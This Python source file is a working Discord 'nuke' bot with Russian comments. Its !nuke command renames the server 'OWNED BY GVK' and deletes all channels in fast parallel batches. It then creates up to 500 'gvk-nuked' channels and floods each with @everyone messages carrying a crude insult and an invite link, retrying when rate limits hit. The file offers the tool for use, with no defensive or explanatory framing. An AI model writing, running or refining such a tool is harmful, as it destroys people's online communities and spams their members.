import discord
from discord.ext import commands
import asyncio
import time

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

# Глобальный счетчик для контроля скорости
channel_counter = 0
start_time = 0

@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов к уничтожению')

@bot.command()
async def nuke(ctx):
    global channel_counter, start_time
    channel_counter = 0
    start_time = time.time()
    
    await ctx.send("**nonerp ebet**")
    
    guild = ctx.guild
    
    # 1. МЕНЯЕМ НАЗВАНИЕ
    try:
        await guild.edit(name="OWNED BY GVK")
        print("✅ Название изменено")
    except:
        print("❌ Не удалось изменить название")
    
    # 2. МАКСИМАЛЬНО БЫСТРОЕ УДАЛЕНИЕ КАНАЛОВ (пачками по 5)
    print("🗑️ МАКСИМАЛЬНО БЫСТРОЕ удаление каналов...")
    
    deleted = 0
    skipped = 0
    channels = list(guild.channels)
    total = len(channels)
    
    async def delete_channels_batch(batch):
        nonlocal deleted, skipped
        tasks = []
        for channel in batch:
            tasks.append(delete_single_channel(channel))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                deleted += 1
            elif result is False:
                skipped += 1
    
    async def delete_single_channel(channel):
        try:
            await channel.delete()
            print(f"   ✅ Удален: #{channel.name}")
            return True
        except discord.Forbidden:
            print(f"   ⚠️ Нет прав: #{channel.name}")
            return False
        except discord.HTTPException as e:
            if "59074" in str(e):
                print(f"   🛡️ Защищенный: #{channel.name}")
                return False
            else:
                print(f"   ❌ Ошибка: {e}")
                return False
        except Exception as e:
            print(f"   ❌ Ошибка: #{channel.name} - {e}")
            return False
    
    # Удаляем пачками по 5 каналов
    batch_size = 5
    for i in range(0, total, batch_size):
        batch = channels[i:i+batch_size]
        await delete_channels_batch(batch)
        
        # Минимальная пауза между пачками
        if (i // batch_size) % 10 == 0:  # После каждых 10 пачек
            await asyncio.sleep(0.2)
        else:
            await asyncio.sleep(0.05)
        
        if (i + batch_size) % 20 == 0:
            print(f"   📦 Удалено {min(i+batch_size, total)}/{total} каналов")
    
    print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
    
    # Пауза перед созданием
    await asyncio.sleep(1)
    
    # 3. МАКСИМАЛЬНО БЫСТРОЕ СОЗДАНИЕ (4 канала в секунду)
    print("🔥 МАКСИМАЛЬНО БЫСТРОЕ создание каналов (4/сек)...")
    
    SPAM_TEXT = """@everyone
**ТРАХНУТЫ BY GVK**

https://discord.gg/sYvDS9mNst

ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ВЕЛИКИМ GVK
"""
    
    created = 0
    failed = 0
    max_channels = 500
    
    # Создаем пачками по 4 канала (4 в секунду)
    async def create_channel_batch(batch_num):
        nonlocal created, failed
        tasks = []
        
        for j in range(4):  # 4 канала в пачке
            i = batch_num * 4 + j
            if i >= max_channels:
                break
            tasks.append(create_single_channel(i))
        
        if not tasks:
            return
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                created += 1
            else:
                failed += 1
    
    async def create_single_channel(i):
        try:
            # Создаем канал
            ch = await guild.create_text_channel(f"gvk-nuked-{i+1}")
            
            # Отправляем 5 сообщений МАКСИМАЛЬНО БЫСТРО
            # Используем gather для параллельной отправки
            messages = [ch.send(SPAM_TEXT) for _ in range(5)]
            await asyncio.gather(*messages)
            
            # Считаем скорость
            global channel_counter
            channel_counter += 1
            elapsed = time.time() - start_time
            speed = channel_counter / elapsed if elapsed > 0 else 0
            
            print(f"✅ [{i+1}] Создан (скорость: {speed:.1f}/сек)")
            return True
            
        except discord.Forbidden:
            print(f"❌ Нет прав на канал {i+1}")
            return False
        except discord.HTTPException as e:
            if "rate" in str(e).lower():
                print(f"⚠️ Rate limit на канале {i+1}, жду...")
                await asyncio.sleep(0.3)
                return await create_single_channel(i)
            else:
                print(f"❌ Ошибка канала {i+1}: {e}")
                return False
        except Exception as e:
            print(f"❌ Ошибка {i+1}: {e}")
            return False
    
    # Создаем пачками по 4 канала
    batch_size = 4
    max_batches = max_channels // batch_size + 1
    
    for batch_num in range(max_batches):
        await create_channel_batch(batch_num)
        
        # Пауза чтобы держать скорость 4/сек
        # 4 канала за ~0.5-0.7 сек, значит пауза ~0.3-0.5 сек
        await asyncio.sleep(0.15)  # Минимальная пауза
        
        # Показываем прогресс каждые 20 каналов
        if created > 0 and created % 20 == 0:
            elapsed = time.time() - start_time
            speed = created / elapsed if elapsed > 0 else 0
            print(f"📊 Прогресс: {created} каналов, скорость: {speed:.1f}/сек")
        
        # Если достигли лимита
        if created >= max_channels:
            print("⚠️ Достигнут лимит каналов")
            break
    
    print("\n" + "="*50)
    print("💀 НЬЮК ЗАВЕРШЁН 💀")
    print(f"✅ Создано каналов: {created}")
    print(f"✅ Сообщений отправлено: {created * 5}")
    print(f"❌ Ошибок: {failed}")
    print(f"⏱️ Время: {time.time() - start_time:.1f} сек")
    print(f"📊 Скорость: {created / (time.time() - start_time):.1f} каналов/сек")
    print("="*50)
    
    try:
        await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nСообщений: {created * 5}\nСкорость: {created / (time.time() - start_time):.1f}/сек")
    except:
        pass

@bot.command()
async def status(ctx):
    await ctx.send("🔥 Бот активен! Используй !nuke")

import os
bot.run(os.environ['TOKEN'])
